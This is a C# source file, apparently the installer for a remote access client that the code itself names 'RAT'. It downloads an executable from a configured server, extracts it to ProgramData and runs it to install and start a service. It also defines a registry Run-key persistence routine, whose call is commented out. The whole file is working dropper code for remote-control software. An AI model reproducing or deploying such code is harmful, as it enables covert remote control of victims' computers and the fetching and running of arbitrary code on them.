using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Client
{
    
    class Program
    {
        static string InstallPath;

        static bool DownloadMainExe() {
            WebClient web = new WebClient();

            if (File.Exists(InstallPath + "\\client.exe"))
                return true;

            var url = $"http://{Data.Server}:{Data.WebServerPort}/client/windows/{Global.Arch}";
            var zipFile = Path.Combine(InstallPath, "windows.zip");
            try
            {
                web.DownloadFile(url, zipFile);
                
                using (var uz = new Unzip(zipFile))
                {
                    if (uz.Entries.Length == 0)
                    {
                        Console.WriteLine($"Invalid file name {zipFile}");
                        return false;
                    }
                    uz.Extract(uz.Entries[0].Name, InstallPath + "\\client.exe");
                }
                File.Delete(zipFile);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unable to download {url}");
                return false;
            }
        }
        static bool SetInStartup(string path)
        {
            try
            {
                var k = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                k.SetValue("RAT", Path.Combine(path, "client.exe"), RegistryValueKind.String);
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }
        static bool StartService()
        {
            try {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WorkingDirectory = InstallPath;
                startInfo.FileName = InstallPath + "\\client.exe";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.Arguments = "--install";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                ConsoleProgress.ShowMessage("Installing service");
                var p = Process.Start(startInfo);
                p.WaitForExit();
                ConsoleProgress.ShowMessageResult(p.ExitCode == 0);

                startInfo.Arguments = "--start";
                ConsoleProgress.ShowMessage("Starting service");
                p = Process.Start(startInfo);
                p.WaitForExit();
                ConsoleProgress.ShowMessageResult(p.ExitCode == 0);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }
        static bool TestConnection()
        {
            var url = $"http://{Data.Server}:{Data.WebServerPort}";
            try
            {
                var web = new WebClient();
                var data = web.DownloadString(url);

                if (data == "PREVENT COMPILER TO OPTIMIZE THIS VARIABLE")
                    return false;
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        static void Main(string[] args)
        {
            if (Data.Ready != 1)
            {
                Console.WriteLine("This client is not created with ClientMaker, 1");
                return;
            }

            //Console.WriteLine(Data.Stringify());
            //return;

            InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "RAT");

            if (!Directory.Exists(InstallPath))
                Directory.CreateDirectory(InstallPath);

            Console.WriteLine("Client installer v 1");
            Console.WriteLine($"Installing to {InstallPath}");

            ConsoleProgress.ShowMessage(String.Format("Connecting to {0}:{1}", Data.Server, Data.WebServerPort));
            bool cnok = TestConnection();
            ConsoleProgress.ShowMessageResult(cnok);

            if (!cnok)
            {
                Console.WriteLine("RAT server is not running!");
                return;
            }

            if (!DownloadMainExe())
            {
                Console.WriteLine("*Error*");
                return;
            }

            if  (Data.CreateIniFile == 1)
                File.WriteAllText(Path.Combine(InstallPath, "data.ini"), 
$@"[connection]
port={Data.NeuronPort}
server={Data.Server}
");

            //SetInStartup(installPath);
            StartService();
            Console.WriteLine($"Successfully installed on path:\n\t {InstallPath}");
            Console.WriteLine("Finished");
            Console.ReadKey();
        }
    }
}
